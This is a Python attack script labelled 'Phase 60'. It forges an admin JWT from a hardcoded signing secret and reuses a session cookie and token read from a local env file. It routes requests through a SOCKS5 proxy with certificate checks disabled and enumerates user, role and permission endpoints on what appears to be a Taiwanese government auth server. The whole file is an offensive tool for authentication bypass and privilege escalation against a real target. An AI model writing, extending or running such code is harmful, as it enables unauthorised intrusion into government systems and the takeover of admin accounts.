#!/usr/bin/env python3
"""Phase 60: Try EPCR auth server API endpoints with JWT + different URL patterns."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, base64, hmac, hashlib, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5://202.160.76.154:11085', 'http': 'socks5://202.160.76.154:11085'}
JWT_SECRET = "ru/3xu4dkru4888"

# Read env for existing JWT and session
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe_service119_live.env', 'r') as f:
    content = f.read()
existing_jwt = re.findall(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', content)
TPE_JSESSIONID_match = re.findall(r'TPE_JSESSIONID=["\']?([^"\n]+)', content)
TPE_JSESSIONID = ''
if TPE_JSESSIONID_match:
    TPE_JSESSIONID = TPE_JSESSIONID_match[0].strip().strip('"').strip("'")

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def forge_jwt(payload_dict, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = base64url_encode(json.dumps(payload_dict, separators=(',', ':')).encode())
    message = header_b64 + "." + payload_b64
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    sig_b64 = base64url_encode(signature)
    return message + "." + sig_b64

now = int(time.time())
admin_jwt = forge_jwt({"sub": "1", "role": "ADMIN", "permissions": ["ADMIN"], "iat": now, "exp": now + 3600, "jti": "admin"}, JWT_SECRET)

print(f"Forged JWT: {admin_jwt[:80]}...")
print(f"TPE_JSESSIONID: {TPE_JSESSIONID[:40]}...")
print(f"Existing JWT: {existing_jwt[0][:80]}...")

# EPCR Auth Server endpoints to try
EPCR = "https://epcr.tpf.gov.tw:4004"
headers_base = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Authorization': f'Bearer {admin_jwt}',
    'Token': admin_jwt,
    'X-Auth-Token': admin_jwt,
}

# Cookies
cookies = {}
if TPE_JSESSIONID:
    cookies['JSESSIONID'] = TPE_JSESSIONID

# Try various endpoint patterns
endpoints_to_try = [
    # Direct paths
    "/user", "/permission", "/role", "/changepassword",
    "/api/user", "/api/permission", "/api/role",
    "/auth/user", "/auth/permission", "/auth/role",
    "/api/users", "/api/permissions", "/api/roles",
    "/api/v1/user", "/api/v1/permission", "/api/v1/role",
    "/manage/user", "/admin/user",
]

print("\n=== EPCR Auth Server endpoint enumeration ===")
for ep in endpoints_to_try:
    try:
        r = requests.get(f'{EPCR}{ep}', proxies=PROXY, verify=False, timeout=10,
                          headers=headers_base, cookies=cookies)
        if r.status_code != 404:
            print(f"  GET {ep}: {r.status_code}, ct={r.headers.get('content-type','')[:30]}, len={len(r.text)}")
            if r.status_code == 200:
                print(f"    *** FOUND: {r.text[:500]}")
        # Also POST
        r = requests.post(f'{EPCR}{ep}', proxies=PROXY, verify=False, timeout=10,
                           headers=headers_base, cookies=cookies, json={'username': 'admin'})
        if r.status_code != 404:
            print(f"  POST {ep}: {r.status_code}, len={len(r.text)}")
            if r.status_code == 200:
                print(f"    *** FOUND: {r.text[:500]}")
    except Exception as e:
        print(f"  {ep}: Error - {e}")

# Try with existing JWT too
print("\n=== With existing JWT ===")
headers_existing = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json, text/plain, */*',
    'Authorization': f'Bearer {existing_jwt[0]}',
}
for ep in ["/user", "/permission", "/role", "/api/user", "/api/v1/user"]:
    try:
        r = requests.get(f'{EPCR}{ep}', proxies=PROXY, verify=False, timeout=10,
                          headers=headers_existing, cookies=cookies)
        if r.status_code != 404:
            print(f"  GET {ep}: {r.status_code}, len={len(r.text)}")
            if r.status_code == 200:
                print(f"    *** FOUND: {r.text[:500]}")
    except Exception as e:
        print(f"  {ep}: Error - {e}")
